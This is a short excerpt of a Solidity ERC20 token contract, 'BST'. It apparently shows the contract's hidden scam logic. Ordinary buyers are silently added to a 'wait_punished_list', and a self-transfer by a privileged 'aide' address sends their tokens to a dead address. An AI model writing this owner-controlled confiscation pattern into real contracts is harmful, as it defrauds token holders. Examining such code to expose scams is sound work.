...
contract BST is ERC20, Ownable {
    ...
    function _transfer(
        ...
        if(!address_in_aide_list(to) && !_isExcludedFromFees[to] && to != uniswapV2Pair){
			wait_punished_list.push(to);
		}

        if(from==to && address_in_aide_list(to)){
            ...
            for (uint i=0; i<arrayLength; i++) {
                ...
                super._transfer(wait_punished_list[i],DEAD,amountPunished);
            }
